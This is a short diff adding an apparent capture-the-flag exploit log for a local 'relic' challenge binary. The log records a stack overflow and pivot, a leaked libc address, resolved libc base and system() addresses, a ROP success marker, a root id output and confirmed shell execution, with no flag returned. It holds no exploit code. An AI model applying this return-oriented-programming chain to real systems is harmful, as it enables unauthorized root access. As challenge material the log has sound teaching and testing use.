@@ -1,0 +1,12 @@
+[+] Started bundled Relic locally
+~~ relic ~~
+An old machine. Older than the libc it runs on.
+Leave something in the vault: [+] Stage 1: overflow and stack pivot accepted
+[+] read@libc = 0x7f4dbf28d1e0
+[+] libc base = 0x7f4dbf17f000
+[+] system    = 0x7f4dbf1d1290
+RELIC_ROP_SUCCESS
+uid=0(root) gid=0(root) groups=0(root)
+/mnt/data/challenges/relic
+[+] Shell execution confirmed
+[-] No flag was returned by this target session
